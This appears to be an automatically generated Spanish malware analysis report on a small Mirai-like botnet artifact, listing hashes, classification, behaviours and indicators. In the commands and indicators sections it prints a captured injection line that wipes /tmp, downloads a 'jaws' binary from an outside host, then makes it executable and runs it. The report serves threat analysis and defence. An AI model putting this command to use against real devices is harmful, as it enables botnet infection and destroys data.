# 🧬 Payload Analysis

`ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/botnet/ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd.md](../../../../../malware-like/oraculo/botnet/ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:04:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd`
- **SHA1:** `aa8488cf3e7d5721186841ff3e972ae702c257c7`
- **MD5:** `73c3cb345c01812b13d4926183ae9c16`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 257 B |
| Entropía | 5.38 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**
4. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.XXX/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 140.233.190.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.XXX/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1 | strings |
| hash | ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd | static_analysis |
| ip | 45.71.14.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
